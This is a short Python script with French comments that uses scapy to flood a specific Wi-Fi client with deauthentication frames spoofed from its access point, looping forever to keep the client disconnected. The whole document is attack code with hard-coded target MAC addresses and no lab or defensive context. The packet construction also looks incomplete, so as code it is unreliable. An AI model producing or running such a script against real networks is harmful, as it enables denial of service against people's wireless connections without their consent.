from scapy.all import *

# Définition des variables
interface = "wlan1"  # interface réseau à utiliser
bssid = "08:36:C9:98:11:A9"  # adresse MAC de l'AP cible
client = "9E:9D:0B:E7:FD:78"  # adresse MAC du client cible

# Fonction pour envoyer des paquets de déconnexion
def deauth(bssid, client):
    packet = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
    send(packet, verbose=0)

# Envoi de paquets de déconnexion en boucle
while True:
    deauth(bssid, client)
